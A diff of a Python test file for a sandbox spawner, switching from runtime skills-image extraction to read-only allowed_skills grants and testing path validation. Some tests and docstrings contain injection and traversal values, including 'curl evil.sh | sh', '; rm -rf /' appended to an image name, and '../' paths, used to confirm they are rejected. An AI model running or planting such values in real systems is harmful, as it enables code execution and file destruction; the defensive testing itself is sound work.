@@ -483,17 +483,17 @@ class TestOpenShellSpawnerSpawn:
         assert captured["command"][:3] == ["python3", "-m", "uvicorn"]
 
 
-class TestSkillsImageDriverSelection:
-    """skills_image routing depends on the auto-detected gateway driver (#198).
+class TestOpenShellSpawnerLegacySkillsDeprecation:
+    """Tests for the skills_image/skills_paths deprecation warning (issue #202).
 
-    Native podman driver_config mounts (no extraction) are only correct when
-    the gateway's own compute driver is actually podman -- otherwise the
-    universal crane/tar fallback (_load_skills) must run instead, or the
-    skills content silently never lands in the sandbox.
+    OpenShellSpawner no longer supports the old runtime mount/extract
+    mechanism -- skills now ship baked into the sandbox image, scoped
+    per-run via allowed_skills instead. A caller still passing the old
+    params must be warned, not silently ignored without a trace.
     """
 
-    def _make_spawner(self, mocker: MockerFixture) -> Any:
-        """Build an OpenShellSpawner with spawn()'s other side effects mocked."""
+    @staticmethod
+    def _make_spawner_and_spawn_kwargs(mocker: MockerFixture):
         from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
 
         class SandboxRef:
@@ -505,7 +505,7 @@ class TestSkillsImageDriverSelection:
         mock_client = mocker.Mock()
         mock_client.create.return_value = SandboxRef("ca-agent-agent-1")
         mock_client.wait_ready.return_value = SandboxRef("ca-agent-agent-1")
-        mock_client.exec_stream.return_value = iter([])
+        mock_client.exec_stream = lambda *a, **k: iter([])
 
         spawner = OpenShellSpawner(openshell_client=mock_client)
         mocker.patch.object(
@@ -522,71 +522,38 @@ class TestSkillsImageDriverSelection:
         return spawner
 
     @pytest.mark.asyncio
-    async def test_podman_driver_skips_tar_fallback(self, mocker: MockerFixture) -> None:
-        """Detected podman driver uses the native mount, not _load_skills."""
-        spawner = self._make_spawner(mocker)
-        mocker.patch.object(spawner, "_detect_compute_driver", return_value="podman")
-        mock_load_skills = mocker.patch.object(spawner, "_load_skills")
+    async def test_skills_image_logs_deprecation_warning(
+        self, mocker: MockerFixture, caplog
+    ) -> None:
+        """Passing skills_image logs a warning naming allowed_skills as the replacement."""
+        import logging
 
-        await spawner.spawn(
-            "agent-1",
-            "sandbox:latest",
-            env={},
-            skills_image="quay.io/example/skills:latest",
-        )
+        spawner = self._make_spawner_and_spawn_kwargs(mocker)
 
-        mock_load_skills.assert_not_called()
+        with caplog.at_level(logging.WARNING):
+            await spawner.spawn(
+                "agent-1",
+                "sandbox:latest",
+                env={},
+                skills_image="quay.io/example/skills:latest",
+            )
 
-    @pytest.mark.asyncio
-    async def test_kubernetes_driver_uses_tar_fallback(self, mocker: MockerFixture) -> None:
-        """Detected kubernetes driver falls back to _load_skills, not the native mount."""
-        spawner = self._make_spawner(mocker)
-        mocker.patch.object(spawner, "_detect_compute_driver", return_value="kubernetes")
-        mock_load_skills = mocker.patch.object(spawner, "_load_skills")
-
-        await spawner.spawn(
-            "agent-1",
-            "sandbox:latest",
-            env={},
-            skills_image="quay.io/example/skills:latest",
-        )
-
-        mock_load_skills.assert_called_once()
+        assert "skills_image" in caplog.text
+        assert "allowed_skills" in caplog.text
 
     @pytest.mark.asyncio
-    async def test_unknown_driver_fails_open_to_tar_fallback(self, mocker: MockerFixture) -> None:
-        """Detection failure/unknown driver falls back to the universal path.
+    async def test_no_legacy_skills_params_no_warning(
+        self, mocker: MockerFixture, caplog
+    ) -> None:
+        """A normal spawn with no legacy params logs nothing about skills_image."""
+        import logging
 
-        Guessing "podman" (the old hardcoded default) on an actual kubernetes
-        gateway silently drops skills content with no error surfaced -- this
-        is exactly the bug being fixed. Failing open to the fallback that
-        works on every driver is the safe choice when detection is
-        inconclusive.
-        """
-        spawner = self._make_spawner(mocker)
-        mocker.patch.object(spawner, "_detect_compute_driver", return_value="")
-        mock_load_skills = mocker.patch.object(spawner, "_load_skills")
+        spawner = self._make_spawner_and_spawn_kwargs(mocker)
 
-        await spawner.spawn(
-            "agent-1",
-            "sandbox:latest",
-            env={},
-            skills_image="quay.io/example/skills:latest",
-        )
+        with caplog.at_level(logging.WARNING):
+            await spawner.spawn("agent-1", "sandbox:latest", env={})
 
-        mock_load_skills.assert_called_once()
-
-    @pytest.mark.asyncio
-    async def test_no_skills_image_never_detects_driver(self, mocker: MockerFixture) -> None:
-        """Spawns without skills_image don't pay for a GetGatewayInfo round-trip."""
-        spawner = self._make_spawner(mocker)
-        mock_detect = mocker.patch.object(spawner, "_detect_compute_driver")
-        mock_load_skills = mocker.patch.object(spawner, "_load_skills")
-
-        await spawner.spawn("agent-1", "sandbox:latest", env={})
-
-        mock_detect.assert_not_called()
-        mock_load_skills.assert_not_called()
+        assert "skills_image" not in caplog.text
 
 
 class TestOpenShellSpawnerDestroy:
@@ -1098,7 +1065,6 @@ class TestFilesystemPolicy:
         assert "/tmp" in rw
         assert "/home/agent" in rw
         assert "/var/log" in rw
-        assert "/app/skills" in rw
         assert "/var/secrets/mcp" in rw
         assert "/var/run/secrets/llm-credentials" in rw
 
@@ -1190,10 +1156,8 @@ class TestBaselineFilesystemPolicy:
 
         assert spec.policy.filesystem.read_write == ["/tmp", "/dev/null"]
 
-    def test_omits_skills_target_write_access_without_skills_image(
-        self, mocker: MockerFixture
-    ) -> None:
-        """No skills_image -- no /app/skills write grant, to avoid a wider writable surface."""
+    def test_no_allowed_skills_grants_no_skills_read_access(self, mocker: MockerFixture) -> None:
+        """No allowed_skills -- no /skills/* entries at all. Least-privilege default."""
         from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
 
         spawner = OpenShellSpawner(openshell_client=object())
@@ -1201,32 +1165,69 @@ class TestBaselineFilesystemPolicy:
 
         spawner._build_baseline_filesystem_policy(spec)
 
-        assert "/app/skills" not in spec.policy.filesystem.read_write
+        assert not any(p.startswith("/skills") for p in spec.policy.filesystem.read_only)
+        assert not any(p.startswith("/skills") for p in spec.policy.filesystem.read_write)
 
-    def test_includes_skills_target_write_access(self, mocker: MockerFixture) -> None:
-        """Baseline grants write access to /app/skills when skills_image is set.
+    def test_allowed_skills_grants_read_only_access_per_name(self, mocker: MockerFixture) -> None:
+        """Each allowed_skills name grants read-only access to /skills/<name> (issue #202).
 
-        Matches _build_filesystem_policy()'s existing grant. Without this,
-        the skills_image tar-upload fallback (_load_skills(), used whenever
-        the gateway's compute driver isn't podman) fails with Landlock
-        "Permission denied" writing into /app/skills -- /app is read-only in
-        the default baseline allowlist, and /app/skills was never added to
-        the write allowlist the way _build_filesystem_policy() (the advisory
-        path) already does. This bug was previously masked entirely by the
-        driver auto-detection gap (#198): before that fix, a caller-
-        configured driver mismatch meant the fallback path was essentially
-        never reached against a real kubernetes-driver gateway.
+        Skills are baked into the sandbox image at build time (see
+        lightspeed-agentic-sandbox) -- nothing writes to them at runtime,
+        so this is read-only, not read_write like the old skills_image
+        tar-upload mechanism needed. OpenShell's read_only access right
+        already includes execute (AccessFs::from_read() = Execute |
+        ReadFile | ReadDir in the landlock crate OpenShell depends on),
+        so skill scripts remain runnable with no separate grant.
         """
         from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
 
         spawner = OpenShellSpawner(openshell_client=object())
         spec = self._make_spec(mocker)
 
-        spawner._build_baseline_filesystem_policy(
-            spec, skills_image="quay.io/example/skills:latest"
-        )
+        spawner._build_baseline_filesystem_policy(spec, allowed_skills=["k8s-diag", "git-ops"])
 
-        assert "/app/skills" in spec.policy.filesystem.read_write
+        assert "/skills/k8s-diag" in spec.policy.filesystem.read_only
+        assert "/skills/git-ops" in spec.policy.filesystem.read_only
+        assert "/skills/k8s-diag" not in spec.policy.filesystem.read_write
+
+    def test_allowed_skills_does_not_grant_unlisted_skills(self, mocker: MockerFixture) -> None:
+        """Only the named skills get a grant -- others baked into the image stay invisible."""
+        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
+
+        spawner = OpenShellSpawner(openshell_client=object())
+        spec = self._make_spec(mocker)
+
+        spawner._build_baseline_filesystem_policy(spec, allowed_skills=["k8s-diag"])
+
+        assert "/skills/git-ops" not in spec.policy.filesystem.read_only
+        assert "/skills/cve-scan" not in spec.policy.filesystem.read_only
+        assert "/skills/security-audit" not in spec.policy.filesystem.read_only
+
+    def test_allowed_skills_rejects_path_traversal_name(self, mocker: MockerFixture) -> None:
+        """A skill name containing '..' or '/' is rejected, not silently joined.
+
+        allowed_skills entries are meant to be bare directory names
+        (e.g. "k8s-diag"), not paths -- a malicious/malformed value like
+        "../../etc" must not be allowed to escape /skills via naive
+        string joining.
+        """
+        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
+
+        spawner = OpenShellSpawner(openshell_client=object())
+        spec = self._make_spec(mocker)
+
+        with pytest.raises(ValueError, match="allowed_skills"):
+            spawner._build_baseline_filesystem_policy(spec, allowed_skills=["../../etc"])
+
+    def test_allowed_skills_rejects_empty_name(self, mocker: MockerFixture) -> None:
+        """An empty-string skill name is rejected."""
+        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
+
+        spawner = OpenShellSpawner(openshell_client=object())
+        spec = self._make_spec(mocker)
+
+        with pytest.raises(ValueError, match="allowed_skills"):
+            spawner._build_baseline_filesystem_policy(spec, allowed_skills=[""])
 
     def test_includes_workdir(self, mocker: MockerFixture) -> None:
         """Baseline sets include_workdir."""
@@ -2248,182 +2249,6 @@ class TestExposeServiceEndpoint:
         assert virtual_host == "internal-gw"
 
 
-class TestComputeDriverDetection:
-    """Tests for _detect_compute_driver() (#198).
-
-    Replaces the old caller-supplied `driver` constructor param: the
-    gateway's own GetGatewayInfo() RPC already reports which compute driver
-    it runs, so the client can ask instead of requiring a human to keep two
-    repos' config in sync (and get it wrong, as happened before).
-    """
-
-    @pytest.mark.asyncio
-    async def test_detects_kubernetes_driver(self, mocker: MockerFixture) -> None:
-        """Reports "kubernetes" when that's the gateway's active driver."""
-        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
-
-        mock_client = mocker.Mock()
-        spawner = OpenShellSpawner(openshell_client=mock_client, endpoint="gw:8080")
-
-        mock_driver_info = mocker.Mock()
-        mock_driver_info.name = "kubernetes"
-        mock_resp = mocker.Mock()
-        mock_resp.compute_drivers = [mock_driver_info]
-
-        mock_stub_cls = mocker.patch(
-            "openshell._proto.openshell_pb2_grpc.OpenShellStub",
-        )
-        mock_stub_cls.return_value.GetGatewayInfo.return_value = mock_resp
-        mocker.patch.object(spawner, "_create_grpc_channel")
-
-        assert await spawner._detect_compute_driver() == "kubernetes"
-
-    @pytest.mark.asyncio
-    async def test_detects_podman_driver(self, mocker: MockerFixture) -> None:
-        """Reports "podman" when that's the gateway's active driver."""
-        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
-
-        mock_client = mocker.Mock()
-        spawner = OpenShellSpawner(openshell_client=mock_client, endpoint="gw:8080")
-
-        mock_driver_info = mocker.Mock()
-        mock_driver_info.name = "podman"
-        mock_resp = mocker.Mock()
-        mock_resp.compute_drivers = [mock_driver_info]
-
-        mock_stub_cls = mocker.patch(
-            "openshell._proto.openshell_pb2_grpc.OpenShellStub",
-        )
-        mock_stub_cls.return_value.GetGatewayInfo.return_value = mock_resp
-        mocker.patch.object(spawner, "_create_grpc_channel")
-
-        assert await spawner._detect_compute_driver() == "podman"
-
-    @pytest.mark.asyncio
-    async def test_caches_result_after_first_call(self, mocker: MockerFixture) -> None:
-        """Only calls GetGatewayInfo once, even across multiple spawns."""
-        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
-
-        mock_client = mocker.Mock()
-        spawner = OpenShellSpawner(openshell_client=mock_client, endpoint="gw:8080")
-
-        mock_driver_info = mocker.Mock()
-        mock_driver_info.name = "kubernetes"
-        mock_resp = mocker.Mock()
-        mock_resp.compute_drivers = [mock_driver_info]
-
-        mock_stub_cls = mocker.patch(
-            "openshell._proto.openshell_pb2_grpc.OpenShellStub",
-        )
-        mock_stub_cls.return_value.GetGatewayInfo.return_value = mock_resp
-        mocker.patch.object(spawner, "_create_grpc_channel")
-
-        first = await spawner._detect_compute_driver()
-        second = await spawner._detect_compute_driver()
-
-        assert first == second == "kubernetes"
-        mock_stub_cls.return_value.GetGatewayInfo.assert_called_once()
-
-    @pytest.mark.asyncio
-    async def test_falls_back_to_empty_when_no_drivers_reported(
-        self, mocker: MockerFixture
-    ) -> None:
-        """Empty compute_drivers list -- fails open to "" (universal path)."""
-        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
-
-        mock_client = mocker.Mock()
-        spawner = OpenShellSpawner(openshell_client=mock_client, endpoint="gw:8080")
-
-        mock_resp = mocker.Mock()
-        mock_resp.compute_drivers = []
-
-        mock_stub_cls = mocker.patch(
-            "openshell._proto.openshell_pb2_grpc.OpenShellStub",
-        )
-        mock_stub_cls.return_value.GetGatewayInfo.return_value = mock_resp
-        mocker.patch.object(spawner, "_create_grpc_channel")
-
-        assert await spawner._detect_compute_driver() == ""
-
-    @pytest.mark.asyncio
-    async def test_falls_back_to_empty_on_rpc_error(self, mocker: MockerFixture) -> None:
-        """gRPC failure fails open to "" (universal path) rather than raising.
-
-        Detection is a best-effort optimization hint, not something that
-        should ever crash a spawn -- a gateway hiccup here must never block
-        the actual sandbox from starting. Uses a plain RuntimeError rather
-        than a real grpc.RpcError -- the fix broadened the catch to
-        `except Exception` specifically because grpc.RpcError alone missed
-        real failure modes (see test_falls_back_to_empty_on_channel_setup_error
-        below), and importing the real `grpc` package isn't available in
-        every test environment (it's part of the optional `openshell` extra).
-        """
-        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
-
-        mock_client = mocker.Mock()
-        spawner = OpenShellSpawner(openshell_client=mock_client, endpoint="gw:8080")
-
-        mock_stub_cls = mocker.patch(
-            "openshell._proto.openshell_pb2_grpc.OpenShellStub",
-        )
-        mock_stub_cls.return_value.GetGatewayInfo.side_effect = RuntimeError("boom")
-        mocker.patch.object(spawner, "_create_grpc_channel")
-
-        assert await spawner._detect_compute_driver() == ""
-
-    async def test_falls_back_to_empty_on_channel_setup_error(self, mocker: MockerFixture) -> None:
-        """A non-RpcError failure (e.g. channel setup) also fails open.
-
-        _create_grpc_channel() raises ValueError (not grpc.RpcError) when a
-        bearer token is configured without TLS -- catching only
-        grpc.RpcError would let this escape _detect_compute_driver() and
-        abort the spawn entirely, contradicting its own "must never block a
-        spawn" contract.
-        """
-        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
-
-        mock_client = mocker.Mock()
-        spawner = OpenShellSpawner(openshell_client=mock_client, endpoint="gw:8080")
-
-        mocker.patch.object(
-            spawner, "_create_grpc_channel", side_effect=ValueError("bearer requires TLS")
-        )
-
-        assert await spawner._detect_compute_driver() == ""
-
-    async def test_retries_after_a_failed_detection(self, mocker: MockerFixture) -> None:
-        """A failed detection is not cached -- the next call retries the RPC.
-
-        Only a successful, non-empty driver name is cached; "" from an
-        error or an empty compute_drivers list must not permanently stick
-        for the rest of this spawner's lifetime.
-        """
-        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
-
-        mock_client = mocker.Mock()
-        spawner = OpenShellSpawner(openshell_client=mock_client, endpoint="gw:8080")
-
-        mock_driver_info = mocker.Mock()
-        mock_driver_info.name = "kubernetes"
-        mock_resp = mocker.Mock()
-        mock_resp.compute_drivers = [mock_driver_info]
-
-        mock_stub_cls = mocker.patch(
-            "openshell._proto.openshell_pb2_grpc.OpenShellStub",
-        )
-        mock_stub_cls.return_value.GetGatewayInfo.side_effect = [
-            RuntimeError("transient blip"),
-            mock_resp,
-        ]
-        mocker.patch.object(spawner, "_create_grpc_channel")
-
-        first = await spawner._detect_compute_driver()
-        second = await spawner._detect_compute_driver()
-
-        assert first == ""
-        assert second == "kubernetes"
-        assert mock_stub_cls.return_value.GetGatewayInfo.call_count == 2
-
 
 class TestGetQuerySslContext:
     """Tests for get_query_ssl_context() (#194).
@@ -2628,282 +2453,3 @@ class TestEntrypointSpawnerFactory:
 
         assert spawner._http_endpoint == "https://proxy.example.com"
 
-
-class TestExtractSkillsImageCraneOnly:
-    """Tests for _extract_skills_image() (issue #202).
-
-    The Podman SDK/CLI fallbacks were removed: both built a shell command
-    string via `" && ".join(f"cp -r {p} ..." for p in copy_paths)` run via
-    `sh -c`, with `copy_paths` sourced directly from request-supplied
-    `skills_paths` (no validation) -- a value like
-    `/skills; curl evil.sh | sh` would execute inside the extraction
-    container. crane never invokes a shell (skills_image is passed as a
-    single argv element to `crane export`), so removing the fallback
-    chain closes that surface entirely rather than just patching it.
-    Extraction now either works via crane or raises -- no silent retry
-    with a different, less-safe mechanism.
-    """
-
-    @staticmethod
-    def _make_spawner(mocker: MockerFixture):
-        from cloud_agents.spawner.openshell_spawner import OpenShellSpawner
-
-        return OpenShellSpawner(openshell_client=mocker.Mock(), endpoint="gw:8080")
-
-    @pytest.mark.asyncio
-    async def test_raises_when_crane_not_found(self, mocker: MockerFixture, tmp_path) -> None:
-        """No crane binary on PATH -> raises immediately, no fallback attempted.
-
-        Matches specifically on "crane binary not found" (not just "crane"
-        anywhere in the message) because the old fallback chain's final
-        error -- "none of crane, Podman SDK, or podman CLI available" --
-        also contains the word "crane", so a looser match would pass even
-        if a fallback were silently still attempted underneath.
-        """
-        spawner = self._make_spawner(mocker)
-        mocker.patch("shutil.which", return_value=None)
-        mock_run = mocker.patch("subprocess.run")
-
-        with pytest.raises(RuntimeError, match="crane binary not found"):
-            await spawner._extract_skills_image(
-                "quay.io/example/skills:latest", ["/skills"], str(tmp_path)
-            )
-
-        mock_run.assert_not_called()
-
-    @pytest.mark.asyncio
-    async def test_raises_when_crane_export_fails(self, mocker: MockerFixture, tmp_path) -> None:
-        """crane present but `crane export` exits non-zero -> raises, no fallback."""
-        spawner = self._make_spawner(mocker)
-        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
-        mock_run = mocker.patch(
-            "subprocess.run",
-            return_value=mocker.Mock(returncode=1, stderr=b"manifest unknown"),
-        )
-
-        with pytest.raises(RuntimeError, match="crane export failed"):
-            await spawner._extract_skills_image(
-                "quay.io/example/skills:latest", ["/skills"], str(tmp_path)
-            )
-
-        mock_run.assert_called_once()
-
-    @pytest.mark.asyncio
-    async def test_crane_export_uses_argv_form_no_shell(
-        self, mocker: MockerFixture, tmp_path
-    ) -> None:
-        """skills_image is passed as a single argv element, not via a shell."""
-        import tarfile
-        from io import BytesIO
-
-        spawner = self._make_spawner(mocker)
-        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
-
-        tar_buf = BytesIO()
-        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
-            info = tarfile.TarInfo(name="skills/hello.txt")
-            data = b"hi"
-            info.size = len(data)
-            tar.addfile(info, BytesIO(data))
-
-        mock_run = mocker.patch(
-            "subprocess.run",
-            return_value=mocker.Mock(returncode=0, stdout=tar_buf.getvalue()),
-        )
-
-        malicious_image = "quay.io/example/skills:latest; rm -rf /"
-        await spawner._extract_skills_image(malicious_image, ["/skills"], str(tmp_path))
-
-        call_args = mock_run.call_args[0][0]
-        assert call_args == ["/usr/local/bin/crane", "export", "--", malicious_image, "-"]
-
-    @pytest.mark.asyncio
-    async def test_crane_export_treats_option_shaped_image_as_literal(
-        self, mocker: MockerFixture, tmp_path
-    ) -> None:
-        """A leading-dash skills_image is not parsed as a crane flag.
-
-        Regression test for a beesarmy review finding on PR #203: without
-        a `--` separator between `export` and the positional skills_image
-        argument, a request-supplied skills_image shaped like an option
-        (e.g. "--insecure") would be parsed by crane as a flag rather
-        than a literal image reference.
-        """
-        import tarfile
-        from io import BytesIO
-
-        spawner = self._make_spawner(mocker)
-        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
-
-        tar_buf = BytesIO()
-        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
-            info = tarfile.TarInfo(name="skills/hello.txt")
-            data = b"hi"
-            info.size = len(data)
-            tar.addfile(info, BytesIO(data))
-
-        mock_run = mocker.patch(
-            "subprocess.run",
-            return_value=mocker.Mock(returncode=0, stdout=tar_buf.getvalue()),
-        )
-
-        option_shaped_image = "--insecure"
-        await spawner._extract_skills_image(option_shaped_image, ["/skills"], str(tmp_path))
-
-        call_args = mock_run.call_args[0][0]
-        assert call_args.index("--") < call_args.index(option_shaped_image), (
-            "the -- separator must precede the option-shaped image so crane treats "
-            "it as a literal reference, not a flag"
-        )
-
-    @pytest.mark.asyncio
-    async def test_extracts_matching_paths_and_strips_prefix(
-        self, mocker: MockerFixture, tmp_path
-    ) -> None:
-        """Files under a matching skill_path are extracted with the prefix stripped."""
-        import tarfile
-        from io import BytesIO
-        from pathlib import Path
-
-        spawner = self._make_spawner(mocker)
-        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
-
-        tar_buf = BytesIO()
-        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
-            data = b"skill content"
-            info = tarfile.TarInfo(name="skills/my-skill/SKILL.md")
-            info.size = len(data)
-            tar.addfile(info, BytesIO(data))
-            other_data = b"unrelated"
-            other_info = tarfile.TarInfo(name="usr/bin/other")
-            other_info.size = len(other_data)
-            tar.addfile(other_info, BytesIO(other_data))
-
-        mocker.patch(
-            "subprocess.run",
-            return_value=mocker.Mock(returncode=0, stdout=tar_buf.getvalue()),
-        )
-
-        await spawner._extract_skills_image(
-            "quay.io/example/skills:latest", ["/skills"], str(tmp_path)
-        )
-
-        extracted = Path(tmp_path) / "my-skill" / "SKILL.md"
-        assert extracted.read_bytes() == b"skill content"
-        assert not (Path(tmp_path) / "usr").exists()
-
-    @pytest.mark.asyncio
-    async def test_member_matching_two_prefixes_extracted_only_once_at_correct_path(
-        self, mocker: MockerFixture, tmp_path
-    ) -> None:
-        """A member is matched against copy_paths at most once, at its correct location.
-
-        Regression test for a beesarmy review finding on PR #203: the
-        extraction loop used to mutate `member.name` in place then keep
-        scanning the remaining copy_paths entries. With
-        copy_paths=["/a", "/b"] and a member named "a/b/c": the first
-        iteration (skill_path="/a") strips the "a/" prefix, mutating
-        member.name to "b/c", and extracts it at tmp_dir/b/c -- correct
-        so far. But the loop then continues to the next skill_path
-        ("/b"), and the now-mutated "b/c" ALSO starts with the "b/"
-        prefix, so it strips again and extracts a SECOND time at
-        tmp_dir/c -- a member that only actually lived under "/a" ends
-        up duplicated at a path that looks like it came from "/b".
-        """
-        import tarfile
-        from io import BytesIO
-        from pathlib import Path
-
-        spawner = self._make_spawner(mocker)
-        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
-
-        tar_buf = BytesIO()
-        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
-            data = b"content"
-            info = tarfile.TarInfo(name="a/b/c")
-            info.size = len(data)
-            tar.addfile(info, BytesIO(data))
-
-        mocker.patch(
-            "subprocess.run",
-            return_value=mocker.Mock(returncode=0, stdout=tar_buf.getvalue()),
-        )
-
-        await spawner._extract_skills_image(
-            "quay.io/example/skills:latest", ["/a", "/b"], str(tmp_path)
-        )
-
-        assert (Path(tmp_path) / "b" / "c").read_bytes() == b"content"
-        assert not (Path(tmp_path) / "c").exists(), (
-            "member must not be re-matched and re-extracted against a second prefix"
-        )
-
-    @pytest.mark.asyncio
-    async def test_traversal_guard_rejects_sibling_dir_sharing_prefix(
-        self, mocker: MockerFixture, tmp_path
-    ) -> None:
-        """A resolved path must be inside tmp_dir, not merely string-prefixed by it.
-
-        Regression test for the missing-separator gap flagged in issue
-        #202: `resolved.startswith(tmp_dir)` (without requiring
-        `tmp_dir + os.sep`) would incorrectly accept a sibling directory
-        whose name happens to share tmp_dir as a string prefix, e.g.
-        tmp_dir="/tmp/skills-x" and resolved="/tmp/skills-xyz/evil" --
-        `"/tmp/skills-xyz".startswith("/tmp/skills-x")` is True even
-        though skills-xyz is not inside skills-x.
-
-        The malicious member must be skipped *before* tar.extract() is
-        ever called for it. This guard is the actual defense, not a
-        backup to a stdlib default: PEP 706's "data" extraction filter
-        only became the *default* in Python 3.14 -- on 3.12/3.13 (what
-        the runner actually deploys, per deploy/workflow-runner/Containerfile's
-        python:3.12-slim base), tarfile.extract() still defaults to
-        "fully_trusted" with no traversal protection at all unless a
-        filter is passed explicitly. This test now passes filter="data"
-        explicitly on the extract call so the code is correct regardless
-        of Python version, rather than relying on a version-dependent
-        default -- but the manual pre-check below is what actually
-        prevents an unsafe write on 3.12/3.13. The other, legitimate
-        member in the same tar must still extract normally, proving this
-        is a graceful per-member skip, not something that depends on the
-        whole extraction failing.
-        """
-        import tarfile
-        from io import BytesIO
-        from pathlib import Path
-
-        spawner = self._make_spawner(mocker)
-        mocker.patch("shutil.which", return_value="/usr/local/bin/crane")
-
-        real_tmp_dir = str(tmp_path / "skills-x")
-        os.makedirs(real_tmp_dir)
-        sibling_dir = str(tmp_path / "skills-xyz")
-        os.makedirs(sibling_dir)
-
-        tar_buf = BytesIO()
-        with tarfile.open(fileobj=tar_buf, mode="w") as tar:
-            # After prefix-stripping "skills/", normpath's to
-            # "../skills-xyz/evil.txt" relative to real_tmp_dir -- landing
-            # in the sibling directory, which merely shares real_tmp_dir
-            # as a string prefix (no os.sep boundary).
-            evil_data = b"escaped"
-            evil_info = tarfile.TarInfo(name="skills/../skills-xyz/evil.txt")
-            evil_info.size = len(evil_data)
-            tar.addfile(evil_info, BytesIO(evil_data))
-
-            good_data = b"legit skill"
-            good_info = tarfile.TarInfo(name="skills/good/SKILL.md")
-            good_info.size = len(good_data)
-            tar.addfile(good_info, BytesIO(good_data))
-
-        mocker.patch(
-            "subprocess.run",
-            return_value=mocker.Mock(returncode=0, stdout=tar_buf.getvalue()),
-        )
-
-        await spawner._extract_skills_image(
-            "quay.io/example/skills:latest", ["/skills"], real_tmp_dir
-        )
-
-        assert not (Path(sibling_dir) / "evil.txt").exists()
-        assert (Path(real_tmp_dir) / "good" / "SKILL.md").read_bytes() == b"legit skill"
